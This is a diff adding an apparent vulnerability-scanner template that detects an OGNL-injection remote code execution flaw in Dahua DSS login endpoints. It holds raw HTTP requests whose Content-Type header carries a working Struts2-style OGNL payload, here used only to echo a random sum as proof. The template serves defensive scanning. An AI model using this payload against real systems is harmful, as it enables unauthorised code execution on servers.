@@ -1,0 +1,38 @@
+id: CNVD-2017-08805
+info:
+  name: Dahua Technology DSS RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects remote code execution vulnerabilities in Dahua Technology DSS systems using crafted OGNL expressions in HTTP headers.
+
+variables:
+  r1: '{{rand_int(40000, 100000)}}'
+  r2: '{{rand_int(40000, 100000)}}'
+
+http:
+  - raw:
+      - |
+        POST /admin/login_login.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: %{(#n='multipart/form-data').(#d=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#d):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println({{r1}}+{{r2}})).(#o.close())}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{to_string(to_number(r1)+to_number(r2))}}"
+  
+  - raw:
+      - |
+        POST /portal/login_init.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: %{(#n='multipart/form-data').(#d=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#d):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println({{r1}}+{{r2}})).(#o.close())}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{to_string(to_number(r1)+to_number(r2))}}"
